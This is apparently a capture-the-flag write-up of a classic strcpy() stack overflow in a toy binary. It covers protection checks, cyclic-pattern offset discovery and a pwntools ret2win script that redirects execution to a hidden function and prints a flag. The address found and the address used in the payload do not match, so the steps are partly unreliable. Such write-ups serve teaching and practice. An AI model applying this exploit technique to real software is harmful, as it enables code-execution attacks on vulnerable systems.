# Buffer Overflow Exploit — advanced_vuln

## Challenge

Binary `advanced_vuln` contains a `secret_function()` that should never be reachable.
Goal: call it via buffer overflow.

## Binary Info

| Protection | Status |
|------------|--------|
| Arch | amd64-64-little |
| RELRO | Partial RELRO |
| Stack Canary | No canary found |
| NX | NX disabled |
| PIE | No PIE (0x400000) |

## Static Analysis

```bash
$ nm advanced_vuln | grep secret
0000000000401156 T secret_function
```

## Vulnerability

`vulnerable_function()` uses `strcpy()` into a 64-byte buffer:

```c
void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking
    printf("You entered: %s\n", buffer);
}
```

## Offset Discovery

Using cyclic pattern:

```bash
$ gdb ./advanced_vuln
(gdb) run $(python3 -c "from pwn import *; print(cyclic(200).decode())")

Program received signal SIGSEGV
rbp: 0x6161617261616171  <- Pattern marker
```

Calculate offset:

```python
from pwn import *
rbp = 0x6161617261616171
offset_rbp = cyclic(500).find(p64(rbp))
offset_rip = offset_rbp + 8  # = 72
```

## Exploit

```python
from pwn import *

payload = b"A" * 72           # Padding to RIP
payload += p64(0x401186)      # secret_function address

p = process("./advanced_vuln_stdin")
p.sendline(payload)
p.sendline(b"id")
print(p.recvall().decode())
```

## Result

```
Congratulations! You found the secret function!
Flag: FLAG{buffer_overflow_master_2025}
```

## Lessons Learned

1. strcpy() = classic buffer overflow vector
2. 64-byte buffer + 8-byte RBP = 72 bytes to RIP
3. No PIE = fixed addresses = easy targeting
4. No canary = no detection
5. Argument null byte issue requires stdin method
